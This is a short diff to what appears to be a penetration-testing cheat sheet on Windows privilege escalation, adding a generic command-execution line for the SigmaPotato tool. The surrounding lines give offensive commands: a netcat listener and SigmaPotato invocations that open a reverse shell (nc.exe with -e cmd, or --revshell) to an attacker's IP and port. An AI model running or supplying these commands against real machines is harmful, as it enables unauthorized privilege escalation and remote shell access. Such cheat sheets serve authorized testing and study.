@@ -98,6 +98,9 @@ sudo nc -lnvp <Port>
 # Step 3: Execute SigmaPotato (RevShell)
 SigmaPotato.exe "C:\Users\Public\nc.exe <IP> <PORT> -e cmd"
 SigmaPotato.exe --revshell <IP> <PORT>
+
+# Execute a Command
+SigmaPotato.exe <command>
 ````
 
 #### PrintSpoofer
